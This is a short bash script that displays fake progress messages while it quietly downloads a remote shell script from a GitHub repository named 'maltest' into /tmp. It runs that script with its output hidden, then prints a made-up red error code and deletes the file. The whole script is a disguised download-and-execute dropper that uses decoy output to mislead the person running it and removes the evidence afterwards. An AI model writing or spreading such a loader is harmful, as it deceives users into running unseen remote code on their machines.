#!/bin/bash
echo "Starting now..."
sleep 5 & curl https://raw.githubusercontent.com/AirplaneA220/maltest/Main/shversion/1.sh 2>/dev/null > /tmp/1.sh
echo "..."
sleep 5
echo "..."
sleep 3
echo "Just a moment now."
sh 1.sh > /dev/null & sleep 5
echo "..."
sleep 3
echo -e "\033[0;31mProcess exited with error code 7x392" & rm /tmp/1.sh